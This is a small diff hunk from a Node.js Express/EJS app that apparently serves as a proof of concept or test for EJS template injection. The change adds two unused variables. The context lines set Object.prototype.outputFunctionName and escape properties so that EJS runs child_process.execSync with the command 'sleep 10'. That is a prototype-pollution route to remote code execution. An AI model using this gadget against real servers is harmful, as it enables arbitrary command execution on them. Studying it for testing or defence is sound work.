@@ -5,7 +5,8 @@ app.set('view engine', 'ejs');
 app.set('views', __dirname + '/views');
 
 cmd = "sleep 10";
-
+var x;
+var y;
 Object.prototype.outputFunctionName = `a;process.mainModule.require('child_process').execSync('${cmd}');//`;
 Object.prototype.client = "notEmpty"; Object.prototype.escapeFunction = '`${process.mainModule.require(\'child_process\').execSync(\'' + cmd + '\')}`';
 Object.prototype.client = "notEmpty"; Object.prototype.escape = '`${process.mainModule.require(\'child_process\').execSync(\'' + cmd + '\')}`';
